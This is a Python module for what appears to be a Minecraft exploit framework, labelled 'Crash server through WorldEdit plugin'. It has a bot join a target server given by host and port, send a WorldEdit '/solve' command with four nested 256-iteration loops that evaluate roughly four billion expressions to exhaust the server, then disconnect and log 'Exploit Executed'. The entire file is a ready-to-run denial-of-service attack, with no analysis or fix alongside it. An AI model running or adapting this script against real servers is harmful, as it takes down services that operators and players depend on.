from mcec.module import Base
from mcec.types import IPv4, Port
from mcec.logger import Logger

from mcec.minecraft import JavaServer
from mcec.minecraft.event import ClientEvent

class McECModule(Base):
    description = "Crash server through WorldEdit plugin"
    author = "asn"
    date = "12-14-22"

    def init(self):
        self.add_option("rhost", "Remote host", IPv4)
        self.add_option("rport", "Remote port", Port)

    def execute(self):
        rhost = self.get_option("rhost")
        rport = self.get_option("rport")

        server = JavaServer(rhost, rport)
        bot = self.bot

        def on_join(event):
            bot.chat_command("/solve", "for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){for(d=0;d<256;d++){ln(pi)}}}}")
            bot.disconnect()

            Logger.success("Exploit Executed")

        bot.add_event_listener(ClientEvent.ON_JOIN, on_join)
        bot.join_server(server)
